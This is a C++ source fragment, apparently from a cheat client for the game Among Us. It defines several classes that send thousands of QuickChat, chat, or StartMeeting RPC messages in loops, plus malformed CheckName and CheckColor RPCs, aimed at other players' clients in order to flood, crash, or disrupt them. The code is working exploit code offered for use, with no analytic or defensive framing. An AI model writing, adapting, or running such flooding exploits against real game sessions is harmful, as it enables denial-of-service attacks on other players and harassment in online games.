...
RPCOPD::RPCOPD(PlayerControl* Player, PlayerControl* target, int count, bool onlyOnTarget)
{
	this->Player = Player;
	this->target = target;
	this->count = count;
...
void RPCOPD::Process()
{
	auto localPlayer = *Game::pLocalPlayer;
	auto targetPlayer = target;

	if (localPlayer == targetPlayer) {
		return; // ≈сли игрок и цель совпадают, не выполн€ем обработку
	}

	constexpr int maxDebugMessages = 30000;
	constexpr const char* errorMessage = "Failure. Should be used correct object reference.";

	auto currentNetId = localPlayer->fields._.NetId;
	auto targetOwnerId = targetPlayer->fields._.OwnerId;

	for (int i = 0; i < maxDebugMessages; ++i) {
		try {
			auto rpcResult = InnerNetClient_StartRpcImmediately(
				reinterpret_cast<InnerNetClient*>(*Game::pAmongUsClient),
				currentNetId,
				static_cast<uint8_t>(RpcCalls__Enum::SendQuickChat),
				SendOption__Enum::None,
				targetOwnerId,
				nullptr
			);

			InnerNetClient_FinishRpcImmediately(
				reinterpret_cast<InnerNetClient*>(*Game::pAmongUsClient),
				rpcResult,
				nullptr
			);
			...
			std::cerr << "Error sending RPC message to player " << targetPlayer->fields._.NetId
				<< ": " << e.what() << std::endl;
		}
	}
}

RPCOPDD::RPCOPDD(PlayerControl* Player, PlayerControl* target, int count, bool onlyOnTarget)
{
	this->Player = Player;
	this->target = target;
	this->count = count;
...
void RPCOPDD::Process()
{
	auto player = State.playerToChatAs.has_value() ? State.playerToChatAs.validate().get_PlayerControl() : *Game::pLocalPlayer;
	auto allPlayers = GetAllPlayerControl();

	if (State.ChatOverloadSpamMode == 1) {
		for (int i = 0; i < 40000; ++i) {
			try {
				auto writer = InnerNetClient_StartRpcImmediately(
					(InnerNetClient*)(*Game::pAmongUsClient),
					player->fields._.NetId,
					uint8_t(RpcCalls__Enum::SendQuickChat),
					SendOption__Enum::None,
					-1,
					nullptr
				);
				MessageWriter_WriteString(writer, convert_to_string(State.chatMessage), nullptr);
				InnerNetClient_FinishRpcImmediately((InnerNetClient*)(*Game::pAmongUsClient), writer, nullptr);
			}
			catch (const std::exception& e) {
				std::cerr << "Error sending RPC message to player " << player->fields._.NetId << ": " << e.what() << std::endl;
			}
		}
	}
}

Blackout::Blackout(PlayerControl* Player, PlayerControl* target, int count)
{
	this->Player = Player;
	this->target = target;
	this->count = count;
...
void Blackout::Process()
{
	auto writer = InnerNetClient_StartRpcImmediately((InnerNetClient*)(*Game::pAmongUsClient), (*Game::pLocalPlayer)->fields._.NetId, uint8_t(RpcCalls__Enum::CheckName), SendOption__Enum::None, target->fields._.OwnerId, NULL);
	MessageWriter_WriteString(writer, convert_to_string("Activated!"), NULL);
	InnerNetClient_FinishRpcImmediately((InnerNetClient*)(*Game::pAmongUsClient), writer, NULL);
}

ATB::ATB(PlayerControl* Player, PlayerControl* target, int count)
{
	this->Player = Player;
	this->target = target;
	this->count = count;
...
void ATB::Process()
{
	auto writer = InnerNetClient_StartRpcImmediately((InnerNetClient*)(*Game::pAmongUsClient), (*Game::pLocalPlayer)->fields._.NetId, uint8_t(RpcCalls__Enum::CheckColor), SendOption__Enum::None, target->fields._.OwnerId, NULL);
	MessageWriter_WriteString(writer, convert_to_string("Activated!"), NULL);
	InnerNetClient_FinishRpcImmediately((InnerNetClient*)(*Game::pAmongUsClient), writer, NULL);
}

NewExploit::NewExploit(PlayerControl* Player, PlayerControl* target, int count)
{
	this->Player = Player;
	this->target = target;
	this->count = count;
...
void NewExploit::Process()
{
	for (int i = 0; i < 10000; ++i)
	{
		auto writer = InnerNetClient_StartRpcImmediately((InnerNetClient*)(*Game::pAmongUsClient),(*Game::pLocalPlayer)->fields._.NetId, uint8_t(RpcCalls__Enum::StartMeeting), SendOption__Enum::None, target->fields._.OwnerId, NULL);
		InnerNetClient_FinishRpcImmediately((InnerNetClient*)(*Game::pAmongUsClient), writer, NULL);
	}
}